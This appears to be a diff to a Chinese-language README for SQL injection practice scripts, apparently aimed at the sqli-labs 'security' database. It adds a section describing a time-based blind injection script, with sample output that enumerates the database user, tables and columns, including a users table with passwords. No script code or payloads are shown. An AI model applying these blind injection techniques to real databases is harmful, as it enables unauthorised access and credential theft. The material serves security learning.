@@ -262,7 +262,7 @@ inputline: c
 效果：
 
 ```
-> python sqli_boolian_blind_binary_chop.py
+$ python sqli_boolian_blind_binary_chop.py
 select user(): root@localhost
 select database(): security
 There are tables emails, referers, uagents, users in database security
@@ -271,3 +271,23 @@ There are columns id, referer, ip_address in table referers
 There are columns id, uagent, ip_address, username in table uagents
 There are columns id, username, password in table users
 ```
+
+
+## sqli_time_blind.py
+
+基于时间的盲注，假设所有字符都是ASCII。
+
+效果：
+
+```
+$ python  sqli_time_blind.py
+select user(): root@localhost
+select database(): security
+There are tables emails, referers, uagents, users in database security
+There are columns id, email_id in table emails
+There are columns id, referer, ip_address in table referers
+There are columns id, uagent, ip_address, username in table uagents
+There are columns id, username, password in table users
+```
+
+看上去和布尔型盲注输出一样，但若将日志级别调为INFO，就可以看到攻击荷载完全不同。
